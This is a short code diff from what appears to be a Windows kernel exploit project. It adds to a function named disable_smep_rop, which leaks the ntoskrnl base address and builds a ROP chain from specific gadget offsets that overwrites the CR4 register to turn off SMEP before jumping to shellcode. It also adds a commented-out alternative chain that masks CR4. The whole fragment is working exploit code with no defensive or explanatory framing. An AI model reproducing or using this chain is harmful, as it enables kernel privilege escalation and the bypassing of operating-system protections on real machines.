@@ -16,9 +16,16 @@ void disable_smep_rop(ByteVector& in_buffer, Address64 shellcode_address)
 	
 	const Address64 ntos_address = PreExploitation::leak_ntos_base();
 
+	// This exploit is very short and simple, but is prone to control register bit pinning, so I have a differrent one below it.
 	static constexpr Address64 WANTED_CR4_VALUE = 0xFFFEFFFFF;
 	const Address64 POP_RCX = ntos_address + 0x2157e5;
 	const Address64 MOV_CR4_RCX = ntos_address + 0x47bf97; // This one is a better cr4 gadget because it is not in the hal functions
+
+	//static constexpr Address64 CR4_AND_MASK = 0xFFFFFFFFFFEFFFFF;
+	//const Address64 MOV_RAX_CR4 = ntos_address + 0xba57bc; // Unwanted byproduct of this one that it also flips on MCE
+	//const Address64 POP_RCX = ntos_address + 0x2157e5;
+	//const Address64 AND_RAX_RCX = ntos_address + 0x5a7c3a;
+	//const Address64 MOV_CR4_RAX = ntos_address + 0xba57c3;
 
 	std::vector<Address64> rop_chain_raw = {
 		POP_RCX,
